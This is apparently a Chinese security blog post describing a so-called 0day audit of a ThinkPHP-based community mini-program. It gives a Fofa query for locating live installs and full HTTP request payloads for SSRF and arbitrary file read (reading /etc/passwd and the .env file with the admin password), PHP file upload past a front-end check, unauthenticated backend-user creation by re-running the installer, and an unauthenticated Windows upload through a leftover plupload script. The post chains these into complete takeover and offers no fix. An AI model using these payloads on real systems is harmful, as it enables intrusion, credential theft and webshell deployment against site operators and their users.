#  某客圈子社区小程序审计(0day)   
Mstir  星悦安全   2024-06-07 18:39  
  
0x00 前言  
  
**█ 纸上得来终觉浅，绝知此事要躬行 █**  
********  
  
**Fofa:"/static/index/js/jweixin-1.2.0.js"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5eDI8kJ4OxzBtdBZLGIHIuxXY71ASTpTONmUEkHg89FlqLoGc9aPggGYicMgSkfictf94eKZFC4Pkibg/640?wx_fmt=png&from=appmsg "")  
****  
****  
**该程序使用ThinkPHP 6.0.12作为框架，所以直接审计控制器即可.****其Thinkphp版本较高，SQL注入不太可能，所以直接寻找其他洞.**  
  
0x01 前台任意文件读取+SSRF  
  
**在 /app/api/controller/Login.php 控制器中，httpGet方法存在curl_exec函数，且传参可控，导致任意文件读取+SSRF漏洞，非常经典的洞.**  
```
public function httpGet($url) {
  $curl = curl_init();
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($curl, CURLOPT_TIMEOUT, 500);
  curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
  curl_setopt($curl, CURLOPT_URL, $url);
  $res = curl_exec($curl);
  curl_close($curl);
  return $res;
  }
```  
Linux Payload:```
/index.php/api/login/httpGet?url=file:///etc/passwd
```  
  
****  
**Windows Payload:**  
```
/index.php/api/login/httpGet?url=file:///C:/windows/win.ini
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eDI8kJ4OxzBtdBZLGIHIux8oCM02TicoLnliaK9vyv1BjyuQicpHHzeLEMkbCuCgQUdLhX1S1ArnECg/640?wx_fmt=other&from=appmsg "")  
****  
**需要查看绝对路径的话直接随便输一些东西让网站报错即可，开了debug的，或者点击网站右下角的Thinkphp图标，能看到绝对路径**  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eDI8kJ4OxzBtdBZLGIHIux8qgWrZoro7ibxLVU3jOanfOMBzQ5OHkyUVJotK6UxliaiaNiag3gwCtX0A/640?wx_fmt=other&from=appmsg "")  
**可以直接读取log文件 /runtime/admin/log/single.log 或者数据库文件/.env 这里能直接看到管理员明文密码的(大概率).******  
  
他的密码加密方式比较特殊 两层md5加盐  
```
/**
 * 密码加密函数
 * @param $password
 * @return string
 */
function xn_encrypt($password)
{
  $salt = 'xiaoniu_admin';
  return md5(md5($password.$salt));
}

```  
而小程序的配置文件存放在 /config/cfg/base.php 中，里边有微信小程序的名字，appid，appselect等信息  
0x02 后台任意文件上传漏洞  
  
在 /app/admin/controller/UploadFiles.php 控制器中，定义了upload方法为上传文件操作，但做了相应权限控制.  
```
/**
     * 文件上传
     * @return \think\response\Json
     * @throws OssException
     */
public function upload()
{
    $folder_name = $this->request->param('folder_name/s','file');
    $result = UploadFilesModel::upload($folder_name);
    return json($result);
  }
```  
  
**直接进后台，随便找个上传点都能上传php文件，就一前端限制，直接绕过即可.**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5eDI8kJ4OxzBtdBZLGIHIuxicDaiaUd7K9wEqINga60YwYeibVXq0iajrxic0iciaRftjDEI9o6pUcb5teXg/640?wx_fmt=png&from=appmsg "")  
Payload:```
POST /index.php/admin/upload_files/upload.html?&water=0 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 197
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYZ7xPRvKeHlg4VIw
Cookie: xxxxxxx
Host: 127.0.0.1:81
Origin: http://127.0.0.1:81
Referer: http://127.0.0.1:81/index.php/admin/upload_files/upload.html?&water=0
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1

------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eDI8kJ4OxzBtdBZLGIHIuxeQpUo6lTFADdHYpUbn6ARu5Ro2icD8GiaB1puw0FibDgbTfrjSUxLwQnw/640?wx_fmt=other&from=appmsg "")  
  
0x03 前台  
未授  
权创建后台用户漏洞  
  
**通过对其权限控制的详细研究，我发现其实不一定要超级管理员用户，只需要普通后台权限用户即可上传文件，那怎么拥有普通后台权限呢？**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5eDI8kJ4OxzBtdBZLGIHIuxM2xibRcJYonQbFJhINr7wwevrAGYURTGjDriaeSl0fEtXSSgG3iclKXww/640?wx_fmt=png&from=appmsg "")  
  
**其实答案在 /app/install/controller/index.php 控制器中，它存在某种逻辑缺陷，安装一遍之后还能够再安装对的，再次安装不会对原有站点造成任何危害，且直接能添加后台用户(虽然不是超级管理员，但已经满足上传文件的条件了)**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5eDI8kJ4OxzBtdBZLGIHIuxhkvVTiaVnAu93gpicqAcibet24TECy4biaAyiaDS5kGSypjlq6e6HyfM28Q/640?wx_fmt=png&from=appmsg "")  
```
public function check()
{
    if (Request::isPost()) {
      $db_config = Config::get('database');
      $db_config['connections']['dynamic'] = [
        'type' => 'mysql',
        'hostname' => Request::post('hostname'),
        'username' => Request::post('username'),
        'password' => Request::post('password'),
        'hostport' => Request::post('hostport'),
        'charset' => Request::post('charset'),
        ];
      Config::set($db_config, 'database');
      try {
        Db::connect('dynamic', true)->connect();
      } catch (\PDOException $exception) {
        return error(['next' => false], $exception->getMessage(), $exception->getCode());
      }
      if ('check' == Request::post('action')) {
        return success(['next' => true], '链接数据库成功' , 200);
      }
      //创建数据库
      $sql = "CREATE DATABASE IF NOT EXISTS `" . Request::post('database') . "` DEFAULT CHARACTER SET " . Request::post('charset');

      try {
        Db::connect('dynamic', false)->execute($sql);
      } catch (\PDOException $exception) {
        return error([], $exception->getMessage(), $exception->getCode());
      }

      Session::set('install_databases', [
                   'type' => 'mysql',
                   'hostname' => Request::post('hostname'),
                   'username' => Request::post('username'),
                   'password' => Request::post('password'),
                   'hostport' => Request::post('hostport'),
                   'database' => Request::post('database'),
                   'charset' => Request::post('charset'),
                   'prefix' => Request::post('prefix')
                   ]);

      $sql_path = app_path() . 'data/install.sql';
      $sql = split_sql($sql_path, Request::post('prefix'), Request::post('charset'));
      Session::set('install_sql', $sql);
      $sql_count = count($sql);

      Session::set('install_error', 0);
      //设置站点名称
      Session::set('install_site', [
                   'title' => Request::post('title'),
                   'keywords' => Request::post('keywords'),
                   'description' => Request::post('description'),
                   'admin_title' => Request::post('admin_title'),
                   ]);

      Session::set('install_admin', [
                   'admin_username' => Request::post('admin_username'),
                   'admin_password' => Request::post('admin_password'),
                   ]);
      return success(['sql_count' => $sql_count]);
    }
  }


public function install()
{
    $database = Session::get('install_databases');

    $sql = Session::get('install_sql');
    $sql_index = Request::post('sql_index') ?: 0;

    $db_config = Config::get('database');

    $db_config['connections']['dynamic'] = $database;

    Config::set($db_config, 'database');

    if ($sql_index >= count($sql)) {
      return success([
                     'sql_error' => Session::get('install_error')?:0,
                     'message' => '数据库安装完成！'
                     ]);
    }
    $sql_to_exec = $sql[$sql_index] . ';';
    try {
      $db = Db::connect('dynamic', true);
      $result = sp_execute_sql($db, $sql_to_exec);
    } catch (\PDOException $exception) {
      return error(['next' => false], $exception->getMessage(), $exception->getCode());
    }
    if (!empty($result['error'])) {
      $install_error = Session::get('install_error') ?: 0;
      Session::set('install_error', $install_error + 1);
    }
    return success($result);
  }
public function admin()
{
    if (Request::isPost()) {
      $admin = Session::get("install_admin");
      $date = time();
      $res = Db::name("admin")
        ->where('id',1)
        ->insert([
                 'username' => $admin['admin_username'],
                 'password' => xn_encrypt($admin['admin_password']),
                 'last_login_ip' => $_SERVER['REMOTE_ADDR'],
                 'last_login_time' => $date,
                 'register_time' => $date,
                 ]);
      if ($res) {
        return success([
                       'error' => 0,
                       'message' => '增加管理员信息成功！'
                       ]);
      }
      return error([],'增加管理员信息失败,请检查配置或者重新安装（需要删掉已安装的数据库）');
    }
  }
```  
  
**其实一看他这段代码，就知道为什么会有某种逻辑缺陷了，将安装的数据写到Session中，然后安装时再利用Session::get()去读取数据.**  
  
**payload 1:**  
```
POST /index.php/install/index/check HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 328
Content-Type: application/json
Cookie: thinkphp_show_page_trace=0|0; thinkphp_show_page_trace=0|0; thinkphp_show_page_trace=0|0; thinkphp_show_page_trace=0|0; Hm_lvt_fc57361ae07d02ff0e22fc7acd0b2553=1711823704,1711863189; __51vcke__Jn7D2bUCe2U5jXJk=2a2f79b5-b57f-565a-a544-da2a60149048; __51vuft__Jn7D2bUCe2U5jXJk=1713527328654; __51uvsct__Jn7D2bUCe2U5jXJk=3; ECS_ID=e2f2a6564b64ffe4b314be9952098e9a4919cbc5; ECS[visit_times]=1; Hm_lvt_8513c8e18c0a7dc33633b4e6b1880ecb=1713617487; Hm_lpvt_8513c8e18c0a7dc33633b4e6b1880ecb=1713617507; ECSCP_ID=54e4831a83b5b6bd7bd76e16a8f583f9adaabbae; think_var=zh-cn; PHPSESSID=2cee48315c70109480b9890a4b0558b3; thinkphp_show_page_trace=0|0
Host: 127.0.0.1:81
Origin: http://127.0.0.1:81
Referer: http://127.0.0.1:81/index.php/install/index/check
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1

{"hostname":"127.0.0.1","hostport":"3306","database":"123123","username":"root","password":"root","charset":"utf8","prefix":"xn_","title":"多客生鲜商城","keywords":"多客生鲜商城","description":"多客生鲜商城","admin_title":"多客生鲜商城","admin_username":"hacker","admin_password":"123456"}
```  
  
**注意，数据库名不能和他原本使用的数据库名一致，使用云数据库也行，上面的任意文件读取漏洞就派上了用场咯.    当出现ok说明数据已经写入到Session中，要是数据库连接不上则不写入到Session.**  
  
****  
**然后我们只需要进入到admin方法，即可将管理员数据写入到原有数据库当中!**  
  
**payload 2:**  
```
POST /index.php/install/index/admin HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 27
Content-Type: application/json
Cookie: thinkphp_show_page_trace=0|0; thinkphp_show_page_trace=0|0; thinkphp_show_page_trace=0|0; thinkphp_show_page_trace=0|0; Hm_lvt_fc57361ae07d02ff0e22fc7acd0b2553=1711823704,1711863189; __51vcke__Jn7D2bUCe2U5jXJk=2a2f79b5-b57f-565a-a544-da2a60149048; __51vuft__Jn7D2bUCe2U5jXJk=1713527328654; __51uvsct__Jn7D2bUCe2U5jXJk=3; ECS_ID=e2f2a6564b64ffe4b314be9952098e9a4919cbc5; ECS[visit_times]=1; Hm_lvt_8513c8e18c0a7dc33633b4e6b1880ecb=1713617487; Hm_lpvt_8513c8e18c0a7dc33633b4e6b1880ecb=1713617507; ECSCP_ID=54e4831a83b5b6bd7bd76e16a8f583f9adaabbae; think_var=zh-cn; PHPSESSID=2cee48315c70109480b9890a4b0558b3; thinkphp_show_page_trace=0|0
Host: 127.0.0.1:81
Origin: http://127.0.0.1:81
Referer: http://127.0.0.1:81/index.php/install/index/check
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1

{"id":1}
```  
  
**然后回到phpmyadmin中，很直观的能看到管理员中多了一条Hacker，而其他数据均无变化，****这也许是程序员安全意识的淡薄，但多半是未料到会有此复杂的逻辑缺陷.**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eDI8kJ4OxzBtdBZLGIHIux458zKYv7lliaSxTVLJUkY8NxwfskJhsU1hic9M7zQnQSMXqc5DhKwxJQ/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eDI8kJ4OxzBtdBZLGIHIuxQyWUdKjnSdgHLofUiczFwjiayX5YvnW3CFHhickcB9JzYF13TxYdvIVWQ/640?wx_fmt=other&from=appmsg "")  
  
**使用创建的后台用户Hacker登录，发现点击任何地方都显示无权限，因为还没设定为后台超级管理员.**  
  
****  
**但这并不妨碍我们上传文件，所以我们可以直接使用前文的后台任意文件洞上传文件，至此，两个完整的利用链形成.**  
  
****## 0x04 Win环境下前台任意文件上传漏洞  
  
**回头想起来这套程序，又搭建了起来研究一下，用seay对public目录扫了一下，发现有几个php文件不太正常**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eDI8kJ4OxzBtdBZLGIHIuxJGMyelNQwnib4Ad52RaC240wpI3bTzZprkyDFbcmPoibgKZQAEQNAo4w/640?wx_fmt=other&from=appmsg "")  
**在/static/newcj/js/dist/plupload-2.3.3/examples/upload.php 中，存在fopen函数，且$_FILES["file"]和$filename传入参数可控，并未有鉴权，导致前台任意文件上传**  
```
<?php
/**
 * upload.php
 *
 * Copyright 2013, Moxiecode Systems AB
 * Released under GPL License.
 */
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
// 5 minutes execution time
@set_time_limit(5 * 60);
// Settings
$targetDir = ini_get("upload_tmp_dir") . DIRECTORY_SEPARATOR . "plupload";
//$targetDir = 'uploads';
$cleanupTargetDir = true; // Remove old files
$maxFileAge = 5 * 3600; // Temp file age in seconds

if (!file_exists($targetDir)) {
  @mkdir($targetDir);
}
// Get a file name
if (isset($_REQUEST["name"])) {
  $fileName = $_REQUEST["name"];
} elseif (!empty($_FILES)) {
  $fileName = $_FILES["file"]["name"];
} else {
  $fileName = uniqid("file_");
}
$filePath = $targetDir . DIRECTORY_SEPARATOR . $fileName;
// Chunking might be enabled
$chunk = isset($_REQUEST["chunk"]) ? intval($_REQUEST["chunk"]) : 0;
$chunks = isset($_REQUEST["chunks"]) ? intval($_REQUEST["chunks"]) : 0;
// Remove old temp files  
if ($cleanupTargetDir) {
  if (!is_dir($targetDir) || !$dir = opendir($targetDir)) {
    die('{"jsonrpc" : "2.0", "error" : {"code": 100, "message": "Failed to open temp directory."}, "id" : "id"}');
  }
  while (($file = readdir($dir)) !== false) {
    $tmpfilePath = $targetDir . DIRECTORY_SEPARATOR . $file;
    // If temp file is current file proceed to the next
    if ($tmpfilePath == "{$filePath}.part") {
      continue;
    }
    // Remove temp file if it is older than the max age and is not the current file
    if (preg_match('/\.part$/', $file) && (filemtime($tmpfilePath) < time() - $maxFileAge)) {
      @unlink($tmpfilePath);
    }
  }
  closedir($dir);
}  
// Open temp file
if (!$out = @fopen("{$filePath}.part", $chunks ? "ab" : "wb")) {
  die('{"jsonrpc" : "2.0", "error" : {"code": 102, "message": "Failed to open output stream."}, "id" : "id"}');
}

if (!empty($_FILES)) {
  if ($_FILES["file"]["error"] || !is_uploaded_file($_FILES["file"]["tmp_name"])) {
    die('{"jsonrpc" : "2.0", "error" : {"code": 103, "message": "Failed to move uploaded file."}, "id" : "id"}');
  }
  // Read binary input stream and append it to temp file
  if (!$in = @fopen($_FILES["file"]["tmp_name"], "rb")) {
    die('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input stream."}, "id" : "id"}');
  }
} else {  
  if (!$in = @fopen("php://input", "rb")) {
    die('{"jsonrpc" : "2.0", "error" : {"code": 101, "message": "Failed to open input stream."}, "id" : "id"}');
  }
}
while ($buff = fread($in, 4096)) {
  fwrite($out, $buff);
}
@fclose($out);
@fclose($in);
// Check if file has been uploaded
if (!$chunks || $chunk == $chunks - 1) {
  // Strip the temp .part suffix off 
  rename("{$filePath}.part", $filePath);
}
// Return Success JSON-RPC response
die('{"jsonrpc" : "2.0", "result" : null, "id" : "id"}');
```  
  
**这里设置了上传路径为$filePath = $targetDir .****DIRECTORY_SEPARATOR . $fileName;**  
  
**其中$targetDir变量为读取php.ini文件的upload_tmp_dir参数为路径，但一般php.ini默认会注释掉这一条，这就导致了上传路径实际会回到该系统盘的根目录去创建一个文件夹 plugload.**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eDI8kJ4OxzBtdBZLGIHIux2xicqPFKYAycic0iabQbEIOFUVYQnNjX2IicTiaWTJnNcyXIE5pkicX0lEbA/640?wx_fmt=other&from=appmsg "")  
  
**而$fileName变量为我们可控的$_REQUEST["name"]传入，而绝对路径咱们怎么拿到呢，我用Seay信息泄露插件批量扫了一下，找到一个报错的地址，直接访问下面的文件即可得到泄露的绝对路径.**  
```
/static/admin/ueditor/php/action_list.php
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eDI8kJ4OxzBtdBZLGIHIuxTVcu2EuJQOiaCNhm7vJ8uLofKncYdAjibEdkudFhOxgfEdibGJicFB1Qsw/640?wx_fmt=other&from=appmsg "")  
  
**得到绝对路径之后，上传自然就不是什么难事了，使用../回到根目录后直接拼接后边到public目录即可**  
  
**Payload (****仅Windows下可用****):**  
```
POST /static/newcj/js/dist/plupload-2.3.3/examples/upload.php?name=绝对路径/aaa.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 197
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2DCAiDBrOjtevKJ7
Host: 127.0.0.1:81
Origin: http://127.0.0.1:81
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"

------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eDI8kJ4OxzBtdBZLGIHIuxDvulYIoGYIl7FibIvsZoLX1kyiaC7Ql2wSiaSzaVekMzviagRNwf3umZzw/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eDI8kJ4OxzBtdBZLGIHIuxSMGvMLIVyNT4a6s7SMKAwpUMdyNO8TRjBfIjV2c5UmWTT5NWQAQoYQ/640?wx_fmt=other&from=appmsg "")  
  
**后面看了一下，发现如果在Linux环境下，会被直接die()回去，且因为$targetDir变量被固定死，所以无法绕过**  
```
  if (!is_dir($targetDir) || !$dir = opendir($targetDir)) {
    die('{"jsonrpc" : "2.0", "error" : {"code": 100, "message": "Failed to open temp directory."}, "id" : "id"}');
  }
```  
  
**我上程序官方gitee看了下开源出来的源码，里边就有这个文件，所以应该是作者本身留下的疏忽，或者后门咯.**  
  
**标签:代码审计,0day,Thinkphp,社区,圈子,小程序,论坛,渗透,编程**  
  
**大家多多关注公众号，一直更新优质文章哟**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**免责声明**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/HVNK6rZ71oofHnCicjcYq2y5pSeBUgibJg8K4djZgn6iaWb6NGmqxIhX2oPlRmGe6Yk0xBODwnibFF8XCjxhEV3K7w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
    **文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
